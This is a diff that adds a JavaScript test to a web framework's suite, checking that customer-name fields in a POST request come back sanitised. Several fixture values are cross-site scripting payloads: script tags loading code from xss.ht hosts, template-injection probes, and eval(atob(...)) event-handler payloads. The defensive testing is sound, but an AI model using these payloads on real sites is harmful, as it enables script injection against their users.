@@ -716,6 +716,105 @@ describe('third group of tests', function() {
 
 });
 
+describe('validation', function() {
+
+    const statsModule = {
+        timing: 'timing stub',
+        counter: () => {}
+    };
+    let counterSpy;
+
+    before(function (done) {
+        counterSpy = sinon.spy(statsModule, 'counter');
+        return beforeEachDescribe(done, 'test', 'yes', 'prod', statsModule);
+    });
+
+    after(afterEachDescribe);
+
+    it('should validate request', function() {
+        return axios({
+            method: 'post',
+            url: 'http://localhost:3001/amorphic/xhr?path=config&form=true',
+            data: {
+                test: {
+                    customers: [
+                        {
+                            customer_id: '615f000b888cfd0029768ab4',
+                            firstName: 'Hello,',
+                            middleName: 'I\'m',
+                            lastName: 'looking to replace the boards on my deck, potentially with composite. Could someone take a look at this and provide a quote?'
+                        },
+                        {
+                            customer_id: '5cf3b8a11aab1900288c2ff4',
+                            firstName: 'input onfocusevalatobthis.id iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOivZJpbmRpLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs autofocus',
+                            middleName: 'input onfocusevalatobthis.id iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOivZJpbmRpLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs autofocus',
+                            lastName: 'input onfocusevalatobthis.id iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOivZJpbmRpLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs autofocus'
+                        },
+                        {
+                            customer_id: '5da3fde483fb31002d74f1bd',
+                            firstName: 'nombre\'">${1-1}{{1-1}}<script src=https://stefano.xss.ht></script>',
+                            middleName: 'medio\'">${1-1}{{1-1}}<script src=https://stefano.xss.ht></script>',
+                            lastName: 'apellido\'">${1-1}{{1-1}}<script src=https://stefano.xss.ht></script>'
+                        },
+                        {
+                            customer_id: '5d7cee1bf0f640002dff04dd',
+                            firstName: 'script.getScriptasdaeffsfwertwerweqwe.xss.htscript',
+                            middleName: 'iframe srcdocasdaeffsfwertwerweqwe.xss.ht',
+                            lastName: 'img srcx iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOivYXNkYWVmZnNmdVydHdlcndlcXdlLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs onerrorevalatobthis.id'
+                        },
+                        {
+                            customer_id: '5d57be0f44fd4b002905b314',
+                            firstName: 'img srcx iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOiveGFZHhhdRLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs onerrorevalatobthis.id',
+                            middleName: 'img srcx iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOiveGFZHhhdRLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs onerrorevalatobthis.id',
+                            lastName: 'img srcx iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOiveGFZHhhdRLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs onerrorevalatobthis.id'
+                        }
+                    ]
+                }
+            },
+            validateStatus: function (status) {
+                return true;
+            }
+        }).then(function(res) {
+            expect(res.status).to.equal(200);
+            expect(counterSpy.callCount).to.equal(9);
+            expect(JSON.stringify(res.data)).to.equal(JSON.stringify({
+                customers: [
+                    {
+                        customer_id: '615f000b888cfd0029768ab4',
+                        firstName: 'Hello',
+                        middleName: 'Im',
+                        lastName: 'looking to replace the boards on my deck potentially with composite. Could someone take a look at this and provide a quote?'
+                    },
+                    {
+                        customer_id: '5cf3b8a11aab1900288c2ff4',
+                        firstName: 'input onfocusevalatobthis.id iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOivZJpbmRpLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs autofocus',
+                        middleName: 'input onfocusevalatobthis.id iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOivZJpbmRpLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs autofocus',
+                        lastName: 'input onfocusevalatobthis.id iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOivZJpbmRpLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs autofocus'
+                    },
+                    {
+                        customer_id: '5da3fde483fb31002d74f1bd',
+                        firstName: 'nombre&quot;${1-1}{{1-1}}script srchttps:stefano.xss.htscript',
+                        middleName: 'medio&quot;${1-1}{{1-1}}script srchttps:stefano.xss.htscript',
+                        lastName: 'apellido&quot;${1-1}{{1-1}}script srchttps:stefano.xss.htscript'
+                    },
+                    {
+                        customer_id: '5d7cee1bf0f640002dff04dd',
+                        firstName: 'script.getScriptasdaeffsfwertwerweqwe.xss.htscript',
+                        middleName: 'iframe srcdocasdaeffsfwertwerweqwe.xss.ht',
+                        lastName: 'img srcx iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOivYXNkYWVmZnNmdVydHdlcndlcXdlLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs onerrorevalatobthis.id'
+                    },
+                    {
+                        customer_id: '5d57be0f44fd4b002905b314',
+                        firstName: 'img srcx iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOiveGFZHhhdRLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs onerrorevalatobthis.id',
+                        middleName: 'img srcx iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOiveGFZHhhdRLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs onerrorevalatobthis.id',
+                        lastName: 'img srcx iddmFyIGEZGjdWlbnQuYJlYXRlRWxlbWVudCgicNyaXBIikYSzcmMImhdHBzOiveGFZHhhdRLnhzcyodCIZGjdWlbnQuYmkeShcHBlbmRDaGlsZChhKTs onerrorevalatobthis.id'
+                    }
+                ]
+            }));
+        });
+    });
+});
+
 describe('processLoggingMessage', function() {
     before(function(done) {
         return beforeEachDescribe(done, 'test', 'no');
